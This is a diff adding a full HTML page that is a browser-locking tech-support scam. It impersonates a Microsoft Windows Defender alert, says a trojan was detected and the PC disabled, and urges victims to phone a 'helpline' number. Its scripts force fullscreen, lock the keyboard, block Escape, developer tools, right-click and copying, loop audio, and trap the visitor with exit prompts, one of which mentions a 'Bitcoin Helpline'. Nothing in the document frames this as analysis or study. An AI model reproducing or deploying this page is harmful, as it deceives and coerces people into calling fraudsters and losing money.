@@ -1,0 +1,457 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Service - Helpline</title>
+<link rel="stylesheet" href="styles.css">
+<script type="text/javascript" src="scripts.js"></script>
+<link rel="icon" type="image/png" href="def.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/665731739a809f19fb36a57b/1hv29ibvf';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+<style>
+body {
+    -webkit-user-select: none;  /* Chrome all / Safari all */
+    -moz-user-select: none;     /* Firefox all */
+    -ms-user-select: none;      /* IE 10+ */
+    -o-user-select: none;
+    user-select: none;
+}
+
+.black {
+  width: 100%;
+    height: 100%;
+    background-color: #000;
+    opacity: 0.3;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+    display: none;
+    z-index: 999999999;
+    left: 0;
+}
+</style>
+
+
+
+<script>
+var elem = document.documentElement;
+function openFullscreen() {
+  if (elem.requestFullscreen) {
+    elem.requestFullscreen();
+  } else if (elem.webkitRequestFullscreen) { /* Safari */
+    elem.webkitRequestFullscreen();
+  } else if (elem.msRequestFullscreen) { /* IE11 */
+    elem.msRequestFullscreen();
+  }
+}
+
+function closeFullscreen() {
+  if (document.exitFullscreen) {
+    document.exitFullscreen();
+  } else if (document.webkitExitFullscreen) { /* Safari */
+    document.webkitExitFullscreen();
+  } else if (document.msExitFullscreen) { /* IE11 */
+    document.msExitFullscreen();
+  }
+}
+</script>
+<script>
+
+  let closePP = document.querySelector('.btn23-primary');
+  let overlay = document.querySelector('.modal23-dialog');
+
+  let KEY_ESC = 27;
+  document.onkeydown = function(e) {
+      if (e.keyCode == KEY_ESC) {
+         document.querySelector('.wrapper').style.cursor="auto";
+         setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 1820);
+
+     }
+ }
+
+
+
+ setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 1820);
+
+ document.addEventListener('click', () => {
+
+
+  document.getElementById("websd").play();
+
+  //document.documentElement.requestFullscreen();
+  document.body.requestFullscreen().then(
+  () => {
+    const keys = [
+      { code: 'Escape' },
+      { code: 'Tab', altKey: true },
+      { code: 'Tab', metaKey: true },
+    ];
+    //navigator.requestSystemKeyboardLock(keys);
+    navigator.keyboard.lock();
+  });
+  document.addEventListener('keydown', event => {
+    if (event.code == 'Escape') {
+      console.dir('escape punched');
+    }
+  }, false);
+  document.querySelector('.modal23-dialog').style.display="none";
+  document.querySelector('.wrapper').style.cursor="none";
+
+
+});
+
+
+
+ document.addEventListener('mouseleave', showDontLeavePopup);
+ var popupShows = 0;
+ function showDontLeavePopup() {
+
+  document.querySelector('.modal-dialog23').style.display="block";
+
+
+}
+
+  </script>
+
+</head>
+
+<body id="mycanvas" class="map" onbeforeunload="return myFunction()" onclick="playSound()" >
+
+  <div class="modal23-dialog">
+    <div class="modal23-content">
+      <div class="modal23-body">
+        <table>
+          <tbody>
+            <tr>
+              <td>
+                <div class="mod_cross"><img src="cross.png"></div>
+                <p class="modal23-p text_block">Confirm the action on the page https://...</p>
+                <p class="text_block modal23-p2">Access to this PC has been disabled! Please contact support.</p>
+            </td>
+        </tr>
+    </tbody>
+</table>
+</div>
+<div class="modal23-footer">
+<button type="button" class="btn23 btn-primary23">OK</button>
+</div>
+</div>
+</div>
+
+<iframe src="https://support.microsoft.com" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+</iframe>
+
+<a  onclick="openFullscreen();" rel="noreferrer" id="link_black" style="">
+    <div class="black" style="height: 600%;"></div>
+</a>
+
+<audio id="websd" loop>
+  <source src="ado.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<div id="lst" class="lst lightbox">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Microsoft Windows Defender  Security Alert </span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro" style="color:#3e3d3d;">
+              <span class="colo-rd" style="color:#3e3d3d;">Use your preferred ID for Login to Windows Defender<br>
+                <span class="colr_bg" style="color:#3e3d3d;">!! TROJAN VIRUS DETECTED !! </span><br>
+              Your personal data is at risk! <br>
+              <span class="colr_bg">Error Code - Er0d2_EN07E</span></span>
+  </div>
+  <div class="">
+    <ul class="imglinks">
+      <li><img src="gif1.gif" alt=""></li>
+      <li><img src="microsoft.png" class="banner" alt=""></li>
+      <li><img src="gif2.gif" alt=""></li>
+    </ul>
+  </div>
+  <div id="disclaimer">
+    Call Microsoft Windows Defender Support immediately to report this threat, prevent identity theft and unlock access to this device.<br>
+      <span class="support" style="color:#2271ff;font-size:22px;">Contact Microsoft Helpline: +1-802-829-3448 (Security Support)</span>
+  </div>
+  <div id="bottom">
+      <ul>
+          <li>
+              <a href="#" >
+                  <div class="fr red">
+                      <span id="addtochromebutton">Deny</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#" >
+                  <div class="fr blink">
+                      <span id="addtochromebutton">Allow</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+</div>
+
+<div id="footer">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt" style="font-weight:600"><img src="msl.png"> Microsoft Windows Defender
+              </span><span style="font-weight: 700;padding-left: 13px;color: #fff;"> Security Alert <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-802-829-3448(Security Support)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Your security is important to us. If you are not aware of this request, please contact us immediately at submiting report.</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv"
+     style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
+     margin-top: -8px; "
+     class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; padding: 5px;"> Did you need to be aware of the risks ? Do not reboot or use
+         Your Device.<br>Your Device is disabled. Please, call Microsoft Windows Defender Support. <br>Access is the block security reason for this
+         Device. <br>Please contact us immediately. A technician will help you solve the problem.</p>
+
+
+</div>
+
+<div id="chrome-alerts" class="chrome-alert" style="padding-top:55px">
+	<div>
+	<a href="javascript:openlink()" class="cross">×</a>
+		<p> <b class="red"> !! VIRUS ATTACK DETECTED !!</b></p>
+		<p class="mntxt"> &nbsp;  &nbsp; <img src="warn.png" alt="" class=""> Your personal data is <br>at risk!</p>
+		<div class="action_buttons">
+		  <a class="" id="leave_page">OK</a>
+		</div>
+	</div>
+</div>
+
+
+<div id="chrome-alerts1" class="chrome-alert" style="padding-top:55px">
+	<div>
+	<a href="javascript:openlink()" class="cross">×</a>
+		<p class="mntxt"> &nbsp;  &nbsp; <img src="warn.png" alt="" class=""> <b class="red">Windows defender data</b> will be leaked, <br>resolve it now!</p>
+		<div class="action_buttons">
+		  <a class="" id="leave_page">OK</a>
+		</div>
+	</div>
+</div>
+
+<div id="chrome-alerts2" class="chrome-alert" style="padding-bottom:50px">
+	<div>
+	<a href="javascript:openlink()" class="cross">×</a>
+		<p> <img src="warn.png" alt="" class="bits"> Runway exception</p>
+		<p class="mntxt"> &nbsp;  &nbsp; <img src="corssbg.png" alt="" class="crossbgs"> Windows Defender detected. Delete viruses?</p>
+		<div class="action_buttons">
+		  <a class="" id="leave_page">OK</a>
+		</div>
+	</div>
+</div>
+
+<div id="chrome-alerts3" class="chrome-alert" style="padding-bottom:50px">
+	<div>
+	<a href="javascript:openlink()" class="cross">×</a>
+		<p> <img src="warn.png" alt="" class="bits"> Runway exception</p>
+		<p class="mntxt"> &nbsp;  &nbsp; <img src="corssbg.png" alt="" class="crossbgs"> A fatal error occurred. Windows Defender can no longer continue safely and will quit.</p>
+		<div class="action_buttons">
+		  <a class="" id="leave_page">OK</a>
+		</div>
+	</div>
+</div>
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+<script type="text/javascript">
+window.onbeforeunload = function() {
+   if (data_needs_saving()) {
+       return "Call Bitcoin Helpline Now";
+   } else {
+      return;
+   }
+};
+        </script>
+        <script type="text/javascript">
+            window.addEventListener("beforeunload", function (e) {
+         var confirmationMessage = 'It looks like you are editing something. '
+                            + 'Your changes will be lost if you leave before saving.';
+
+                (e  window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+<script type="text/javascript">
+
+
+
+        // To disable right click
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+
+
+        // To disable F12 options
+
+        document.onkeypress = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+        document.onmousedown = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+        document.onkeydown = function (event) {
+
+            event = (event  window.event);
+
+            if (event.keyCode == 123) {
+
+                return false;
+
+            }
+
+        }
+
+
+
+        // To To Disable ctrl+c, ctrl+u
+
+
+
+        jQuery(document).ready(function ($) {
+
+            $(document).keydown(function (event) {
+
+                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
+
+
+
+                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
+
+                    alert('Sorry, this feature is disabled!');
+
+//disable key press porcessing
+
+                    return false;
+
+                }
+
+            });
+
+        });
+
+
+
+    </script>
+
+
+
+
+    <script language=JavaScript>
+//Disable right mouse click Script
+
+var message="";
+
+function clickIE4(){
+if (event.button==2){
+alert(message);
+return false;
+ }
+}
+
+function clickNS4(e){
+if (document.layers||document.getElementById&&!document.all){
+if (e.which==2||e.which==3){
+alert(message);
+return false;
+}
+}
+}
+
+if (document.layers){
+document.captureEvents(Event.MOUSEDOWN);
+document.onmousedown=clickNS4;
+}
+else if (document.all&&!document.getElementById){
+document.onmousedown=clickIE4;
+}
+
+document.oncontextmenu=new Function("return false")
+
+</script>
+
+  </body>
+
+
+</html>
